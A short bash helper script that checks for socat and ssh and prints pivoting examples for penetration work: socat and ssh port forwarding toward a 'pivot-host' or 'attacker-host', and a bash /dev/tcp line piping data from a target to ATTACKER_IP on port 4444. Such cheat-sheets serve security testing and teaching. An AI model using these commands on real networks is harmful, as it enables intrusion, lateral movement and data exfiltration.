#!/bin/bash
# -----------------------------------------------------------------------------
# Checks for available port forwarding tools (socat, ssh) and displays
# usage examples for pivoting.
# -----------------------------------------------------------------------------

# Check for socat
if command -v socat >/dev/null 2>&1; then
    echo "[+] socat found"
    echo "Forward local port 8080 to target 10.0.0.5:80:"
    echo "  socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80 &"
fi

# Check for ssh
if command -v ssh >/dev/null 2>&1; then
    echo "[+] ssh found"
    echo "Local Port Forwarding (Access remote service locally):"
    echo "  ssh -L 8080:10.0.0.5:80 user@pivot-host"
    echo "Remote Port Forwarding (Expose local service remotely):"
    echo "  ssh -R 8080:127.0.0.1:80 user@attacker-host"
    echo "Dynamic Port Forwarding (SOCKS Proxy):"
    echo "  ssh -D 1080 user@pivot-host"
fi

# Bash /dev/tcp redirection
echo "[+] Bash /dev/tcp redirection (Concept):"
echo "  # Connect to target and pipe to local listener (requires listener on attacker)"
echo "  bash -c 'cat < /dev/tcp/10.0.0.5/80 > /dev/tcp/ATTACKER_IP/4444'"
